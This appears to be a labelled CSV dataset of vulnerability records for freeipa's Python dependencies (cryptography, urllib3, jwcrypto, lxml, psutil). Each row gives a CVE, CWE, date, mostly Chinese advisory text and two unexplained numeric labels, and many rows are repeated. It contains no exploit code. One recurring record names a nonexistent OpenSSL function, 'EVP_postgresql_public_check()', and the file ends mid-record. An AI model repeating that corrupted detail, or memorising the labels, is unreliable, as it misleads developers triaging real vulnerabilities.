freeipa_freeipa,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
freeipa_freeipa,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
freeipa_freeipa,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
freeipa_freeipa,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
freeipa_freeipa,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
freeipa_freeipa,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
freeipa_freeipa,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
freeipa_freeipa,urllib3,,True,,CWE-453,2020-12-02,"## Overview
[urllib3](https://pypi.org/project/urllib3/) is a HTTP library with thread-safe connection pooling, file post, and more.

Affected versions of this package are vulnerable to Insecure Defaults. The default SSL/TLS settings were insecure.
## Remediation
Upgrade `urllib3` to version 1.8 or higher.
## References
- [GitHub Commit](https://github.com/urllib3/urllib3/commit/2088570a293df42b1623dd74fcff0174d0565af5)
",3,2
freeipa_freeipa,urllib3,,True,CVE-2020-26137,CWE-74,2020-09-29,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.25.9之前版本存在注入漏洞。该漏洞源于可以在putrequest()的第一个参数中插入CR和LF控制字符。</p>,3,2
freeipa_freeipa,urllib3,,True,CVE-2019-11324,CWE-295,2019-04-18,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本中存在信任管理问题漏洞。该漏洞源于网络系统或产品中缺乏有效的信任管理机制。攻击者可利用默认密码或者硬编码密码、硬编码证书等攻击受影响组件。",2,2
freeipa_freeipa,urllib3,,True,CVE-2019-11236,CWE-93,2019-04-15,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3 1.24.1及之前版本版本中存在注入漏洞，该漏洞源于用户输入构造命令、数据结构或记录的操作过程中，网络系统或产品缺乏对用户输入数据的正确验证，未过滤或未正确过滤掉其中的特殊元素，导致系统或产品产生解析或解释方式错误。</p>,3,0
freeipa_freeipa,urllib3,,True,CVE-2018-20060,CWE-288,2018-12-11,"urllib3是一个基于Python的HTTP库，它具有线程安全连接池和文件后期支持等功能。
urllib3 1.23之前版本中存在安全漏洞，该漏洞源于程序在进行跨源重定向时，没有移除Authorization HTTP报头，导致授权报头中的凭证暴露给其他主机或以明文的形式传输。攻击者可利用该漏洞获取敏感信息。",1,2
freeipa_freeipa,urllib3,,True,CVE-2021-33503,CWE-400,2021-06-02,"<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 Urllib3 存在资源管理错误漏洞，该漏洞源于在鉴权模块的URL中添加@参数导致，攻击者可利用该漏洞引起资源冲突导致拒绝服务。以下产品及型号会受到影响：Urllib3 0.3, 0.3.1, 0.4, 0.4.1, 1.0, 1.0.1, 1.0.2, 1.1, 1.2, 1.2.1, 1.3, 1.4, 1.5, 1.6, 1.7, 1.7.1, 1.8, 1.8.1, 1.8.2, 1.8.3, 1.9, 1.9.1, 1.10, 1.10.1, 1.10.2, 1.10.3, 1.10.4, 1.11, 1.12, 1.13, 1.13.1, 1.14, 1.15, 1.15.1, 1.16, 1.17, 1.18, 1.18.1, 1.19, 1.19.1, 1.20, 1.21, 1.21.1, 1.22, 1.23, 1.24, 1.24.1, 1.24.2, 1.24.3, 1.25, 1.25.1, 1.25.2, 1.25.3, 1.25.4, 1.25.5, 1.25.6, 1.25.7, 1.25.8, 1.25.9, 1.25.10, 1.25.11, 1.26.0, 1.26.1, 1.26.2, 1.26.3, 1.26.4。</p>",2,2
freeipa_freeipa,urllib3,,True,CVE-2023-45803,CWE-200,2023-10-17,<p>urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。 urllib3存在安全漏洞，该漏洞源于从303状态更改请求方法重定向到GET后不会删除请求正文。受影响的产品和版本：urllib3 2至2.0.6版本，1.26.17及之前版本。</p>,3,0
freeipa_freeipa,urllib3,,True,CVE-2018-25091,CWE-601,2023-10-15,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3 1.24.2之前版本存在安全漏洞，该漏洞源于允许攻击者获取授权标头中的凭据或以明文形式传输凭据。",3,0
freeipa_freeipa,urllib3,,True,CVE-2023-43804,CWE-200,,<p>urllib3 是一个支持线程安全连接池及文件上传等功能的 HTTP 客户端库。该库不对 `Cookie` HTTP 标头进行特殊处理，用户在发送请求时需自行管理。在未显式禁用重定向的情况下，用户可能会意外地通过 HTTP 重定向将信息泄露至其他源。攻击者可利用此漏洞，获取用户的 Cookie 信息，从而进行账户劫持。受影响的版本包括 1.26.16 及之前版本，以及 2.0.5 之前版本。</p>,2,1
freeipa_freeipa,urllib3,,True,CVE-2024-37891,CWE-669,2024-06-17,"urllib3是一款Python HTTP库。该产品具有线程安全连接池、文件发布支持等。
urllib3存在安全漏洞，该漏洞源于跨域重定向期间不会剥离代理授权请求标头。",3,0
freeipa_freeipa,urllib3,,True,CVE-2025-50181,CWE-601,2025-06-19,<p>urllib3 是一个常用的 HTTP 客户端库，广泛用于处理 HTTP 请求和响应，包括重定向和重试机制。此漏洞涉及 urllib3 对重定向和重试的处理机制，其中 `Retry` 对象用于控制两者设置。在实例化 `PoolManager` 时设置 `retries` 参数以尝试禁用重定向，然而由于 `retries` 参数被忽略，导致不能正确禁用重定向。该问题会影响依赖于禁用重定向功能的应用程序，可能因此暴露于服务端请求伪造（SSRF）或开放重定向漏洞中。</p>,3,2
freeipa_freeipa,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
freeipa_freeipa,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
freeipa_freeipa,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
freeipa_freeipa,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
freeipa_freeipa,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
freeipa_freeipa,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
freeipa_freeipa,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
freeipa_freeipa,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
freeipa_freeipa,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
freeipa_freeipa,cryptography,,True,CVE-2023-0217,CWE-476,2023-02-07,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。在3.0.0到3.0.7版本的OpenSSL中，应用程序使用EVP_postgresql_public_check()函数检查格式错误的DSA公钥时，可能触发无效指针解引用漏洞，导致拒绝服务。,2,2
freeipa_freeipa,cryptography,,True,CVE-2016-9243,CWE-20,2016-11-01,"Cryptography是一个用于Python开发的加密工具包。HKDF是其中的一个基于HMAC的密钥导出函数。
Cryptography 1.5.2之前的版本中的HKDF存在安全漏洞。攻击者可利用该漏洞获取敏感信息的访问权限或绕过安全限制，执行未授权的操作。",2,2
freeipa_freeipa,cryptography,,True,CVE-2023-0401,CWE-476,2023-02-07,OpenSSL是一个开源的通用加密库，支持SSL和TLS协议。该漏洞出现在3.0.0到3.0.7版本，当验证PKCS7签名数据时，缺少对初始化函数返回值的检查，可能导致空指针解引用，从而引发程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2020-25659,CWE-385,2020-10-25,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 存在安全漏洞，该漏洞源于定时oracle攻击进行RSA解密。",2,0
freeipa_freeipa,cryptography,,True,,CWE-415,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

Double free vulnerability in the dsa_priv_decode function in crypto/dsa/dsa_ameth.c in OpenSSL 1.0.1 before 1.0.1s and 1.0.2 before 1.0.2g allows remote attackers to cause a denial of service (memory corruption) or possibly have unspecified other impact via a malformed DSA private key. (related to CVE-2016-0705)

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 0.9.1 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#091---2015-06-06)
- [Github PR](https://github.com/pyca/cryptography/pull/2013)
- [Gtihub Commit](https://github.com/pyca/cryptography/commit/87c99a503a699f5c0296636237a9208fc161cc9e)
",2,2
freeipa_freeipa,cryptography,,True,,CWE-400,2017-12-04,"## Overview
Affected versions of [`cryptography`](https://pypi.python.org/pypi/cryptography) are vulnerable to Denial of Service (DoS).

The OpenSSL backend beffore 1.0.2 made use of assertions to check response where the tests could not trigger a failure. If a user ran Python with this -O flag and got an invalid response code this could lead to a crash.

## Details
Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](npm:ws:20171108)

## Remediation
Upgrade `cryptography` to version 1.0.2 or higher.

## References
- [GitHub Changelog](https://github.com/pyca/cryptography/blob/master/CHANGELOG.rst#102---2015-09-27)
- [Redhat Bugzilla](https://bugzilla.redhat.com/show_bug.cgi?id=1267548)
",3,2
freeipa_freeipa,cryptography,,True,,CWE-222,2015-09-10,"## Overview
[`cryptography`](https://pypi.python.org/pypi/cryptography) provides cryptographic recipes and primitives to Python developers.

Affected versions of this package are vulnerable to TLS Truncation. A malicious user can prevent a user from fetching the parts of a message by inserting TCP code into a message indicating the message has completed.

## References
- [GitHub PR](https://github.com/pyca/cryptography/pull/2334)
- [GitHub Commit](https://github.com/pyca/cryptography/commit/41aabcbd2326ae154a16a1a050ee01fb9a54bd19)
",3,2
freeipa_freeipa,cryptography,,True,CVE-2023-2650,CWE-770,2023-05-30,OpenSSL是OpenSSL团队的一个开源的能够实现安全套接层（SSLv2/v3）和安全传输层（TLSv1）协议的通用加密库。该产品支持多种加密算法，包括对称密码、哈希算法、安全散列算法等。该漏洞源于处理特制的ASN.1对象标识符时可能非常慢，导致系统拒绝服务。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-50782,CWE-208 CWE-203,2023-12-13,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography存在安全漏洞。攻击者利用该漏洞可以获取敏感信息。",2,2
freeipa_freeipa,cryptography,,True,CVE-2022-4203,CWE-125,2023-02-07,OpenSSL是一个开源的能够实现SSL和TLS协议的通用加密库，支持多种加密算法。该漏洞源于在X.509证书验证中，尤其是在名称约束检查阶段，可以触发读缓冲区溢出。,3,0
freeipa_freeipa,cryptography,,True,CVE-2023-0216,CWE-476,2023-02-07,OpenSSL是一个开源的能够实现安全套接层和安全传输层协议的通用加密库，支持多种加密算法。存在无效指针解引用漏洞。当应用程序尝试使用 d2i_PKCS7()、d2i_PKCS7_bio() 或 d2i_PKCS7_fp() 函数加载格式错误的 PKCS7 数据时，可能会导致程序崩溃。,2,2
freeipa_freeipa,cryptography,,True,CVE-2023-38325,CWE-295,2023-07-14,"python-cryptography是Cryptographic团队的一个应用于加密的 Python 代码库。
python-cryptography 41.0.2之前版本存在安全漏洞，该漏洞源于会错误地处理具有关键选项的 SSH 证书。",2,2
freeipa_freeipa,dnspython,,True,CVE-2023-29483,CWE-292,2024-02-11,"Eventlet是Python的一个并发网络库。
Eventlet 0.35.2之前版本存在安全漏洞，该漏洞源于允许远程攻击者通过从预期的IP地址和源端口快速发送无效数据包来干扰DNS名称解析。",2,0
freeipa_freeipa,jwcrypto,,True,CVE-2022-3102,CWE-287,2022-09-22,jwcrypto 是一个支持 JSON Web Token (JWT) 的加密库，专门用于处理和操作 JWT 令牌中的加密和签名功能。该漏洞的根本原因在于 JWT 自动检测令牌类型的特性。在处理 JSON Web Encryption (JWE) 令牌时，攻击者可以将使用公钥加密的 JWE 令牌替换为已签名的 JSON Web Signature (JWS) 令牌，从而绕过系统的授权机制，导致不当的访问权限被授予。,3,0
freeipa_freeipa,jwcrypto,,True,CVE-2023-6681,CWE-400,2023-12-29,"JWCrypto是JWCrypto开源的一个 Javascript 对象签名和加密 (JOSE) Web 标准的实现。
JWCrypto存在安全漏洞，该漏洞源于允许攻击者发起拒绝服务(DoS)攻击以及可能的密码暴力破解和字典攻击。",3,2
freeipa_freeipa,jwcrypto,,True,CVE-2024-28102,CWE-770,2024-03-06,"JWCrypto是JWCrypto开源的一个 Javascript 对象签名和加密 (JOSE) Web 标准的实现。
JWCrypto 1.5.5及之前版本存在安全漏洞，该漏洞源于允许攻击者通过传入高压缩比的恶意 JWE Token 来引发 DoS 攻击。",3,0
freeipa_freeipa,jwcrypto,,True,CVE-2016-6298,CWE-200,2016-08-31,"jwcrypto是一套使用Python开发并实现JavaScript对象签名和加密的标准。
jwcrypto 0.3.2之前的版本中的jwa.py中的RSA 1.5版本的算法实现过程中的_Rsa15类存在安全漏洞，该漏洞源于程序缺少Random Filling保护机制。远程攻击者可借助Million Message Attack利用该漏洞获取明文数据。",3,0
freeipa_freeipa,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
freeipa_freeipa,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
freeipa_freeipa,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
freeipa_freeipa,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
freeipa_freeipa,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
freeipa_freeipa,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
freeipa_freeipa,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
freeipa_freeipa,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
freeipa_freeipa,psutil,,True,CVE-2019-18874,CWE-415,2019-11-11,"psutil是一款基于Python的进程和系统监视库。
psutil 5.65及之前版本中存在资源管理错误漏洞。远程攻击者可借助特制数据利用该漏洞导致应用程序崩溃（拒绝服务）。",2,2
freeipa_freeipa,psutil,,True,,CWE-362,2023-11-01,"## Overview
[psutil](https://github.com/giampaolo/psutil) is a cross-platform lib for process and system monitoring in Python

